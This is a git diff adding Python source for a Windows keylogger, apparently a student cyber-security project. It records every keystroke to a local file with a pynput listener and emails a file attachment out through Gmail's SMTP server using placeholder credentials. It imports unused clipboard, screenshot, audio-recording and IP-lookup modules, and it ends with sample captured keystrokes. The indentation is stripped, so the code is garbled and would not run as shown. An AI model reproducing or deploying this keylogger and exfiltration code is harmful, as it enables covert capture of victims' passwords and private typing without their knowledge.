@@ -1,1 +1,100 @@
-# Anagha-
+# Libraries
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+import socket
+import platform
+import win32clipboard
+from pynput.keyboard import Key, Listener
+import time
+import os
+from scipy.io.wavfile import write
+import sounddevice as sd
+from cryptography.fernet import Fernet
+import getpass
+from requests import get
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+keys_information = "key_log.txt"
+file_path = "C:\\Users\\kusha\\PycharmProjects\\pythonProject4\\Python"
+extend = "\\"
+fromaddr = "EMAIL address of the sender"
+toaddr = "EMAIL address of the receiver"
+# instance of MIMEMultipart
+msg = MIMEMultipart()
+# storing the senders email address
+msg['From'] = fromaddr
+# storing the receivers email address
+msg['To'] = toaddr
+# storing the subject
+msg['Subject'] = "Subject of the Mail"
+# string to store the body of the mail
+body = "Body_of_the_mail"
+# attach the body with the msg instance
+msg.attach(MIMEText(body, 'plain'))
+# open the file to be sent
+filename = "File_name_with_extension"
+attachment = open("C:\\Users\\kusha\\Desktop\\Cyber Security\\Major Project\\index.html", "rb")
+# instance of MIMEBase and named as p
+p = MIMEBase('application', 'octet-stream')
+# To change the payload into encoded form
+
+p.set_payload((attachment).read())
+# encode into base64
+encoders.encode_base64(p)
+p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+# attach the instance 'p' to instance 'msg'
+msg.attach(p)
+# creates SMTP session
+s = smtplib.SMTP('smtp.gmail.com', 587)
+# start TLS for security
+s.starttls()
+# Authentication
+s.login(fromaddr, "Password_of_the_sender")
+# Converts the Multipart msg into a string
+text = msg.as_string()
+# sending the mail
+s.sendmail(fromaddr, toaddr, text)
+# terminating the session
+s.quit()
+count = 0
+keys =[]
+def on_press(key):
+global keys, count
+print(key)
+keys.append(key)
+count += 1
+if count >= 1:
+count = 0
+write_file(keys)
+keys =[]
+def write_file(keys):
+with open(file_path + extend + keys_information, "a") as f:
+for key in keys:
+k = str(key).replace("'", "")
+if k.find("space") > 0:
+f.write('\n')
+f.close()
+elif k.find("Key") == -1:
+f.write(k)
+f.close()
+def on_release(key):
+if key == Key.esc:
+return False
+with Listener(on_press=on_press, on_release=on_release) as listener:
+listener.join()
+
+OUTPUT:
+s<100><99><99><97>
+<97><105><100><103><99><97><99><101><101><99><103><104><105><105><96><99><98><100><103><103><102>hello
+world
+hello
+world
+my
+name
+is
+anagha
+kerala
+
